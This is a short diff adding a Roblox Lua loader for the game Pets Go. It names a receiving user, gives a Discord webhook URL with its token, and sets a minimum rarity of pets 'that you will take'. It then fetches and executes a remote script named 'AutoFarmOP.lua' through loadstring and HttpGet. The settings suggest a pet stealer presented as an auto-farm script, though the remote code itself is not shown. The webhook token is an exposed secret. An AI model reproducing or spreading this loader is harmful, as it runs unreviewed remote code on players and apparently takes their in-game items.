@@ -1,0 +1,4 @@
+_G.User = "spangbob241"
+_G.Webhook = "https://discord.com/api/webhooks/1315624415437914162/qCk8jMqNafHTwEW7Z7KztRlsNCXl--koMZgGqBNNwfrs08EZnwLWUrgRcIFB6SaKJtUp"
+_G.Min = 20000000 -- Minimum pet rarity that you will take
+loadstring(game:HttpGet("https://raw.githubusercontent.com/vestyx/PetsGO/refs/heads/main/AutoFarmOP.lua", true))()
